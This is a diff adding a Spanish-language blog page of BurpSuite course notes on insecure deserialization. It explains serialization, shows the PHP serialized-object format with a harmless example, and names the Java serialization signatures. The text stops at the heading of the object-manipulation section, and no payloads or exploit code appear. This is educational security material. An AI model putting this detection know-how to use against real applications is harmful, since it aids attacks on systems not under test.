@@ -1,0 +1,1584 @@
+<!DOCTYPE html>
+<html lang="en">
+<!-- Beautiful Jekyll 5.0.0 | Copyright Dean Attali 2020 -->
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  
+
+  
+
+  <title>17. Insecure Deserialization.</title>
+
+  
+  <meta name="author" content="Qv1nTv5">
+  
+
+  <meta name="description" content="Detección y explotación de vulnerabilidades de Deserialización Insegura a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+  
+  <link rel="alternate" type="application/rss+xml" title="Home" href="http://localhost:4000/feed.xml">
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+      
+  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+
+    
+      
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.min.css">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic">
+
+
+    
+      
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800">
+
+
+    
+  
+
+  
+    
+      <link rel="stylesheet" href="/assets/css/bootstrap-social.css">
+    
+      <link rel="stylesheet" href="/assets/css/beautifuljekyll.css">
+    
+  
+
+  
+
+  
+  
+  
+
+  
+
+  
+  <meta property="og:site_name" content="Home">
+  <meta property="og:title" content="17. Insecure Deserialization.">
+  <meta property="og:description" content="Detección y explotación de vulnerabilidades de Deserialización Insegura a través de la herramienta BurpSuite.">
+
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:article:author" content="Qv1nTv5">
+  <meta property="og:article:published_time" content="2022-03-22T00:00:00-04:00">
+  <meta property="og:url" content="http://localhost:4000/2022-03-22-17.Insecure_deserialization/">
+  <link rel="canonical" href="http://localhost:4000/2022-03-22-17.Insecure_deserialization/">
+  
+
+  
+  <meta name="twitter:card" content="summary">
+  
+  <meta name="twitter:site" content="@Qvintvs1">
+  <meta name="twitter:creator" content="@Qvintvs1">
+
+  <meta property="twitter:title" content="17. Insecure Deserialization.">
+  <meta property="twitter:description" content="Detección y explotación de vulnerabilidades de Deserialización Insegura a través de la herramienta BurpSuite.">
+
+  
+
+  
+
+
+  
+
+  
+
+</head>
+
+
+<body>
+
+  
+
+
+  <nav class="navbar navbar-expand-xl navbar-light fixed-top navbar-custom top-nav-regular"><a class="navbar-brand" href="http://localhost:4000/">Home</a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="main-navbar">
+    <ul class="navbar-nav ml-auto">
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Program</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/Cpage">C</a>
+                  <a class="dropdown-item" href="/DHARMApage">Dharma</a>
+            </div>
+          </li>
+        
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Pentest</a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                  <a class="dropdown-item" href="/BURPSUITEpage">Burp</a>
+                  <a class="dropdown-item" href="/THMpage">Thm</a>
+                  <a class="dropdown-item" href="/HackTheBoxpage">Htb</a>
+                  <a class="dropdown-item" href="/PEN200page">BasicPentesting</a>
+                  <a class="dropdown-item" href="/REDTEAMBASICSpage">RedTeam</a>
+                  <a class="dropdown-item" href="/BLUETEAMBASICSpage">Blueteam</a>
+                  <a class="dropdown-item" href="/REDESpage">Net</a>
+                  <a class="dropdown-item" href="/2022-11-17-GitBasics">Git</a>
+            </div>
+          </li>
+        
+        <li class="nav-item">
+          <a class="nav-link" id="nav-search-link" href="#" title="Search">
+            <span id="nav-search-icon" class="fa fa-search"></span>
+            <span id="nav-search-text">Search</span>
+          </a>
+        </li></ul>
+  </div>
+
+  
+
+  
+
+</nav>
+
+
+
+<div id="beautifuljekyll-search-overlay">
+
+  <div id="nav-search-exit" title="Exit search">✕</div>
+  <input type="text" id="nav-search-input" placeholder="Search">
+  <ul id="search-results-container"></ul>
+  
+  <script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
+  <script>
+    var searchjson = '[ \
+       \
+        { \
+          "title"    : "2. Constants and Literals in C.", \
+          "category" : "C", \
+          "url"      : "/2024-12-10-1.ConstantsinC-copy/", \
+          "date"     : "December 10, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "1. Basics of C", \
+          "category" : "C", \
+          "url"      : "/2024-12-02-1.BasicsOfC/", \
+          "date"     : "December  2, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "DHA", \
+          "url"      : "/2024-09-24-Dharma_Tutorial/", \
+          "date"     : "September 24, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Gramáticas en Dharma", \
+          "category" : "fuzz", \
+          "url"      : "/2024-03-22-Dharma_Tutorial-copy/", \
+          "date"     : "March 22, 2024" \
+        }, \
+       \
+        { \
+          "title"    : "Mi experiencia con el OSCP", \
+          "category" : "pen", \
+          "url"      : "/2023-11-19-PEN200_Experience/", \
+          "date"     : "November 19, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Client Side", \
+          "category" : "pen", \
+          "url"      : "/2023-11-17-17.Client_Side_Attacks/", \
+          "date"     : "November 17, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Deep Packet Tunneling", \
+          "category" : "pen", \
+          "url"      : "/2023-11-16-16.Tunneling_Through_Deep_Packet_Inspection/", \
+          "date"     : "November 16, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Report", \
+          "category" : "pen", \
+          "url"      : "/2023-11-15-15.Making_Reports/", \
+          "date"     : "November 15, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "pen", \
+          "url"      : "/2023-11-14-14.Metasploit/", \
+          "date"     : "November 14, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Password Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-13-13.Password_Attacks/", \
+          "date"     : "November 13, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Active Directory Attacks", \
+          "category" : "pen", \
+          "url"      : "/2023-11-12-12.Active_Directory_Attacks/", \
+          "date"     : "November 12, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Port Forwarding", \
+          "category" : "pen", \
+          "url"      : "/2023-11-11-11.Port_Forwarding/", \
+          "date"     : "November 11, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Privilege Escalation", \
+          "category" : "pen", \
+          "url"      : "/2023-11-10-10.Privilege_Escalation/", \
+          "date"     : "November 10, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "File Transfers", \
+          "category" : "pen", \
+          "url"      : "/2023-11-09-9.File_Tranfers/", \
+          "date"     : "November  9, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Buffer Overflows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-08-8.Buffer_Overflows/", \
+          "date"     : "November  8, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Vulnerability Scanning.", \
+          "category" : "pen", \
+          "url"      : "/2023-11-07-7.Vulnerability_Scanning/", \
+          "date"     : "November  7, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Information Gathering", \
+          "category" : "pen", \
+          "url"      : "/2023-11-06-6.Active_Information_Gathering/", \
+          "date"     : "November  6, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Windows", \
+          "category" : "pen", \
+          "url"      : "/2023-11-05-5.Windows/", \
+          "date"     : "November  5, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Networking", \
+          "category" : "pen", \
+          "url"      : "/2023-11-04-4.Networking/", \
+          "date"     : "November  4, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Scripting", \
+          "category" : "pen", \
+          "url"      : "/2023-11-03-3.Scripting/", \
+          "date"     : "November  3, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Practical Tools", \
+          "category" : "pen", \
+          "url"      : "/2023-11-02-2.PracticalTools/", \
+          "date"     : "November  2, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Linux", \
+          "category" : "pen", \
+          "url"      : "/2023-11-01-1.Linux/", \
+          "date"     : "November  1, 2023" \
+        }, \
+       \
+        { \
+          "title"    : "Easy", \
+          "category" : "hack", \
+          "url"      : "/2022-12-01-Easy/", \
+          "date"     : "December  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Git Basics", \
+          "category" : "", \
+          "url"      : "/2022-11-17-GitBasics/", \
+          "date"     : "November 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier I", \
+          "category" : "hack", \
+          "url"      : "/2022-11-10-Tier_1/", \
+          "date"     : "November 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Tier 0", \
+          "category" : "hack", \
+          "url"      : "/2022-11-09-Tier_0/", \
+          "date"     : "November  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7.BufferOverflow.", \
+          "category" : "thm", \
+          "url"      : "/2022-11-02-7.BufferOverflow/", \
+          "date"     : "November  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6.Offensive Pentesting", \
+          "category" : "thm", \
+          "url"      : "/2022-11-01-6.OffensivePentesting/", \
+          "date"     : "November  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5.RedTeam", \
+          "category" : "thm", \
+          "url"      : "/2022-10-30-5.RedTeam/", \
+          "date"     : "October 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4.Windows", \
+          "category" : "thm", \
+          "url"      : "/2022-10-22-4.Windows/", \
+          "date"     : "October 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3.Junior Penetrationtester path", \
+          "category" : "thm", \
+          "url"      : "/2022-09-02-3.JRPenetrationTester/", \
+          "date"     : "September  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2.Complete Begginer path.", \
+          "category" : "thm", \
+          "url"      : "/2022-08-07-2.CompleteBegginer/", \
+          "date"     : "August  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1.Pre-Security path.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-11-1Pre-Security/", \
+          "date"     : "July 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "0.Scripting for pentesters.", \
+          "category" : "thm", \
+          "url"      : "/2022-07-10-0.Scripting_for_pentesters/", \
+          "date"     : "July 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Burp Certified Practitioner Practice Exam.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-30-PracticeExam/", \
+          "date"     : "March 30, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "22. OAuth Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-27-22.OAuth_authentication/", \
+          "date"     : "March 27, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "21. HTTP Request Smuggling.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-26-21.HTTP_request_smuggling/", \
+          "date"     : "March 26, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "20. HTTP Host Header Attacks.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-25-20.HTTP_Host_header_attacks/", \
+          "date"     : "March 25, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "19. Web Cache Poisoning.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-24-19.Web_cache_poisoning/", \
+          "date"     : "March 24, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "18. Server-Side Template Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-23-18.Serve-side_template_injection/", \
+          "date"     : "March 23, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "17. Insecure Deserialization.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-22-17.Insecure_deserialization/", \
+          "date"     : "March 22, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "16. WebSockets.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-21-16.WebSockets/", \
+          "date"     : "March 21, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "15.DOM-based XSS vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-20-15-DOM-based_vulnerabilities/", \
+          "date"     : "March 20, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "14. Clickjacking.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-19-14.Clickjacking/", \
+          "date"     : "March 19, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "13. Cross-Origin Resource Sharing.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-18-13.Cross-origin_resource_sharing_(CORS)/", \
+          "date"     : "March 18, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "12. Cross-Site Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-17-12.Cross-site_request_forgery_(CSRF)/", \
+          "date"     : "March 17, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "11. Cross-Site Scripting.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-16-11.Cross-site_scripting_(XSS)/", \
+          "date"     : "March 16, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "10. XXE Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-15-10.XXE_injection/", \
+          "date"     : "March 15, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "9. Server-Side Request Forgery.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-14-9.Server-side_request_forgery/", \
+          "date"     : "March 14, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "8. File Upload.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-13-8.File_upload_vulnerabilities/", \
+          "date"     : "March 13, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "7. Access Control.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-12-7.Access_control/", \
+          "date"     : "March 12, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "6. Information Disclosure.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-11-6.Information_disclosure/", \
+          "date"     : "March 11, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "5. Bussiness Logic Vulnerabilities.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-10-5.Business_logic_vulnerabilities/", \
+          "date"     : "March 10, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "4. Command Injection.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-09-4.Command_Injection/", \
+          "date"     : "March  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "3. Directory Traversal.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-08-3.Directory_Traversal/", \
+          "date"     : "March  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "2. Authentication.", \
+          "category" : "burp", \
+          "url"      : "/2022-03-07-2.Authentication/", \
+          "date"     : "March  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "1. SQLInjection", \
+          "category" : "burp", \
+          "url"      : "/2022-03-06-1.SQLInjection/", \
+          "date"     : "March  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Seguridad Perimetral", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Seguridad_Perimetral/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Hardening de sistemas", \
+          "category" : "blueteam", \
+          "url"      : "/2022-02-09-Hardening_de_sistemas/", \
+          "date"     : "February  9, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Bandit", \
+          "category" : "otw", \
+          "url"      : "/2022-02-08-Bandit/", \
+          "date"     : "February  8, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Proxy", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Proxys/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Protocolos Relevantes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Protocolos_Importantes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Curso Básico Redes", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-Precurso_Redes/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "IPs", \
+          "category" : "redes", \
+          "url"      : "/2022-02-07-IPs/", \
+          "date"     : "February  7, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Movimientos Laterales", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-06-Introducci%C3%B3n_a_movimientos_laterales/", \
+          "date"     : "February  6, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Evasión de Defensas", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Evasi%C3%B3n_de_Defensas/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Escalada de privilegios", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-05-Escalada_de_privilegios/", \
+          "date"     : "February  5, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Metasploit", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-04-Metasploit_B%C3%A1sico/", \
+          "date"     : "February  4, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a aplicaciones Android", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-03-Ataques_aplicaciones_android/", \
+          "date"     : "February  3, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataque a aplicaciones web.", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-02-Ataques_a_aplicaciones_web/", \
+          "date"     : "February  2, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Ataques a Infraestructuras y Redes", \
+          "category" : "redteam", \
+          "url"      : "/2022-02-01-Ataques_a_Infraestructuras_y_Redes/", \
+          "date"     : "February  1, 2022" \
+        }, \
+       \
+        { \
+          "title"    : "Análisis de Objetivos", \
+          "category" : "redteam", \
+          "url"      : "/2022-01-28-An%C3%A1lisis_de_Objetivos/", \
+          "date"     : "January 28, 2022" \
+        }, \
+       \
+       \
+        { \
+          "title"    : "Blueteam Basics", \
+          "category" : "page", \
+          "url"      : "/BLUETEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PortSwigger BurpSuite Course", \
+          "category" : "page", \
+          "url"      : "/BURPSUITEpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "C programming subjects.", \
+          "category" : "page", \
+          "url"      : "/Cpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Dharma Fuzzer language", \
+          "category" : "page", \
+          "url"      : "/DHARMApage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Exploiting &amp; Reversing", \
+          "category" : "page", \
+          "url"      : "/EXPREVpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Fuzzing JavaScript Engine", \
+          "category" : "page", \
+          "url"      : "/Fuzzpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "HackTheBox", \
+          "category" : "page", \
+          "url"      : "/HackTheBoxpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "PEN200 notes", \
+          "category" : "page", \
+          "url"      : "/PEN200page/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Proyectos", \
+          "category" : "page", \
+          "url"      : "/PROJECTSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Networking Basics", \
+          "category" : "page", \
+          "url"      : "/REDESpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "RedTeam Basics", \
+          "category" : "page", \
+          "url"      : "/REDTEAMBASICSpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Retired Machines", \
+          "category" : "page", \
+          "url"      : "/RetiredMachinespage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "TryHackMe", \
+          "category" : "page", \
+          "url"      : "/THMpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "About me", \
+          "category" : "page", \
+          "url"      : "/aboutme/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "THM", \
+          "category" : "page", \
+          "url"      : "/preOSCPpage/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Tag Index", \
+          "category" : "page", \
+          "url"      : "/tags/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page2/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page3/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page4/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page5/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page6/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page7/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page8/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page9/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page10/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page11/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page12/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page13/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page14/", \
+          "date"     : "January 1, 1970" \
+        }, \
+       \
+        { \
+          "title"    : "Germán Sanmillán", \
+          "category" : "page", \
+          "url"      : "/page15/", \
+          "date"     : "January 1, 1970" \
+        } \
+       \
+    ]';
+    searchjson = JSON.parse(searchjson);
+
+    var sjs = SimpleJekyllSearch({
+      searchInput: document.getElementById('nav-search-input'),
+      resultsContainer: document.getElementById('search-results-container'),
+      json: searchjson
+    });
+  </script>
+</div>
+
+
+
+
+
+  <!-- TODO this file has become a mess, refactor it -->
+
+
+
+
+
+
+
+<header class="header-section ">
+
+<div class="intro-header no-img">
+  <div class="container-md">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+        <div class="post-heading">
+          <h1>17. Insecure Deserialization.</h1>
+          
+            
+              <h2 class="post-subheading">Detección y explotación de vulnerabilidades de Deserialización Insegura a través de la herramienta BurpSuite.</h2>
+            
+          
+
+          
+            <span class="post-meta">Posted on March 22, 2022</span>
+            
+            
+          
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+</header>
+
+
+
+
+
+<div class=" container-md ">
+  <div class="row">
+    <div class=" col-xl-8 offset-xl-2 col-lg-10 offset-lg-1 ">
+
+      
+
+      
+
+      <article role="main" class="blog-post">
+        <h2 id="0-índice">0. Índice.</h2>
+
+<ul>
+  <li>1 Antecedentes.
+    <ul>
+      <li>1.1. Concepto de serialización y deserialización.</li>
+      <li>1.2. Deserialización Insegura.</li>
+    </ul>
+  </li>
+  <li>2 Explotación de vulnerabilidades de deserialización inseguras.
+    <ul>
+      <li>2.1. Antecedentes. Formatos de serialización.</li>
+      <li>2.2. Manipulación de objetos serializados.</li>
+    </ul>
+  </li>
+  <li>3 Trabajando con dispositivos en cadena.
+    <ul>
+      <li>3.1. ysoserial.</li>
+      <li>3.2. PHP Generic Gadget Chain.</li>
+      <li>3.3. Trabajando con gadget chains documentadas.</li>
+    </ul>
+
+    <p><br /></p>
+  </li>
+</ul>
+
+<h3 id="1-antecedentes">1. Antecedentes.</h3>
+
+<h4 id="11-concepto-de-serialización-y-deserialización">1.1. Concepto de serialización y deserialización.</h4>
+
+<p>La <strong>serialización</strong> de un objeto es el proceso de conversión de estructuras de datos complejas a formatos más simples, como un flujo de bytes, que permita la escritura y transmisión de datos de una manera más sencilla.</p>
+
+<p>La <strong>deserialización</strong> es el proceso de restaurar este formato simple, como un flujo de bytes, a una réplica completamente funcional del objeto original, en el estado exacto en que se serializó para que pueda ser implementado dentro de la lógica del sitio web.</p>
+
+<div style="text-align:center">
+	<img src="/assets/img/Burp/Pasted%20image%2020220506100401.png" text-align="center" />
+</div>
+
+<p><br /></p>
+
+<h4 id="12-deserialización-insegura">1.2. Deserialización Insegura.</h4>
+
+<p>Una <strong>deserialización insegura</strong> permite que un atacante introduzca objetos dañinos al código de la aplicación.</p>
+
+<p>Incluso es posible reemplazar un objeto serializado con un objeto de una clase completamente diferente. Por esta razón, <strong>la deserialización insegura a veces se conoce como una vulnerabilidad de “inyección de objetos”</strong>.</p>
+
+<p>Esta generalmente surge porque existe una falta general de comprensión de cuán peligrosa puede ser la deserialización de datos controlables por el usuario. <strong>Idealmente, ningún dato potencialmente controlable por el usuario nunca debe deserializarse en absoluto</strong>, no es posible deserializar de forma segura la entrada de datos que no es de confianza.</p>
+
+<p><br /></p>
+
+<h3 id="2-explotación-de-vulnerabilidades-de-deserialización-inseguras">2. Explotación de vulnerabilidades de deserialización inseguras.</h3>
+
+<p>Aunque muchos de los laboratorios y ejemplos se basan en PHP, la mayoría de las técnicas de explotación son igualmente válidas para otros lenguajes.</p>
+
+<p><br /></p>
+
+<h4 id="21-antecedentes-formatos-de-serialización">2.1. Antecedentes. Formatos de serialización.</h4>
+
+<p>Identificar la deserialización insegura es relativamente simple, durante la auditoría, debe observar todos los datos que se transfieren al sitio web e <strong>intentar identificar cualquier cosa que parezca datos serializados. Los datos serializados se pueden identificar con relativa facilidad si conoce el formato que utilizan los diferentes lenguajes</strong>. En esta sección, mostraremos ejemplos de la serialización de PHP y Java. Una vez que identifique los datos serializados, puede probar si puede controlarlos.</p>
+
+<ul>
+  <li><strong>Formato de serialización PHP</strong>:</li>
+</ul>
+
+<p>PHP utiliza un formato de cadena en su mayoría legible por humanos, con letras que representan el tipo de datos y números que representan la longitud de cada entrada. Por ejemplo, considere un <em>User</em> objeto con los atributos:</p>
+
+<pre><code class="language-PHP">$user-&gt;name = "carlos";
+$user-&gt;isLoggedIn = true;
+</code></pre>
+
+<p>Al serializarse, el objeto se ve como sigue:</p>
+
+<pre><code class="language-default">O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}
+</code></pre>
+
+<p>Que se interpreta de la siguiente manera:</p>
+
+<ul>
+  <li><strong>0:4:”User”</strong>: Un objeto con el nombre de clase de cuatro caracteres; User.</li>
+  <li><strong>2</strong>: El objeto tiene 2 atributos.</li>
+  <li><strong>s:4:”name”</strong>: La clave del primer atributo es un string de 4 caracteres “name”.</li>
+  <li><strong>s:6:”carlos”</strong>: El valor del primer atributo es la cadena de 6 caracteres “carlos”.</li>
+  <li><strong>s:10:”isLoggedIn”</strong>: La clave del segundo atributo es un string de 10 caracteres “isLoggedIn”.</li>
+  <li><strong>b:1</strong>: El valor del segundo atributo es el valor booleano true.</li>
+</ul>
+
+<p>Los métodos nativos para la serialización de PHP son <em>serialize()</em> y <em>unserialize()</em>. Si tiene acceso al código fuente, debe comenzar por buscar en <em>unserialize()</em> cualquier parte del código e investigar más a fondo.</p>
+
+<p><br /></p>
+
+<ul>
+  <li><strong>Formato de serialización de Java</strong>:</li>
+</ul>
+
+<p>Algunos lenguajes, como Java, usan formatos de serialización binarios. Esto es más difícil de leer, pero aún puede identificar datos serializados si sabe cómo reconocer algunos signos reveladores. Por ejemplo, los objetos Java serializados siempre comienzan con los mismos bytes, que se codifican ’ac ed’ en hexadecimal y ’rO0’ en Base64.</p>
+
+<p>Cualquier clase que implemente la interfaz <em>java.io.Serializable</em> se puede serializar y deserializar. Si tiene acceso al código fuente, tome nota de cualquier código que use el <em>readObject()</em> método, que se usa para leer y deserializar datos de un archivo <em>InputStream</em>.</p>
+
+<p><br /></p>
+
+<h4 id="22-manipulación-de-objetos-serializados">2.2. Manipulación de objetos serializados.</h4>
+
